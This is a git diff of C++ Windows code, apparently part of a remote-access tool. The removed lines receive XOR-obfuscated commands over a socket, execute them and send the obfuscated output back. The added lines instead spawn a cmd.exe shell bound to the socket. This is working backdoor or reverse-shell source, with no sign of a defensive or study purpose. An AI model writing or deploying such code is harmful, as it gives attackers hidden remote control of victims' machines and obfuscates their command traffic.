@@ -97,38 +97,10 @@ int main()
     vector <string> utf8exec;
 
     _setmode(_fileno(stdout), 0x00020000); //Si cette fonction est called alors il est impossible d'utilisee cout
-    while(true)
-    {
-        ZeroMemory(&buff_char, strlen(buff_char));
-        ZeroMemory(&buff_wchar, wcslen(buff_wchar));
 
-        w_cmd.erase();
-        recv(sock, (char *)buff_wchar, sizeof(buff_wchar), 0);
-        wcout << "Commande: " <<  buff_wchar << endl;
-        //w_cmd = ConvertUtf8ToWide( XOREncryption((string) buff_char) );
-        w_cmd = XORencryption((wstring) buff_wchar);
-
-        utf8exec =  Exec().executeCommand(w_cmd);
-
-        for(int i = 0;i < utf8exec.size(); i++)
-        {
-            w_cmd = ConvertUtf8ToWidee(utf8exec[i]);
-            w_cmd = XORencryption(w_cmd);
-           // for(int i=0; i< w_cmd.length(); i++)
-           // {
-            //    wcout << "i: " << i << " char: " << w_cmd.at(i) << endl;
-            //}
-
-            wcout << w_cmd.length() <<endl;
-           
-            send(sock,(char *)w_cmd.c_str(), w_cmd.length() * sizeof(WCHAR),   0);
-            wcout << "send : " << w_cmd << endl;
-            wcout << "len cmd: " << utf8exec[i].length() << endl;
-            Sleep(300);
-        }
-        send(sock,(char *) XORencryption(L"\r\n").c_str(), 4 ,0);
-        exit(0);
-    }
+    WCHAR testt[] = L"cmd.exe";
+    Exec().spawnSHELL(sock, testt);
+    wcout << "finsish" << endl;
     
     return 0;
 }
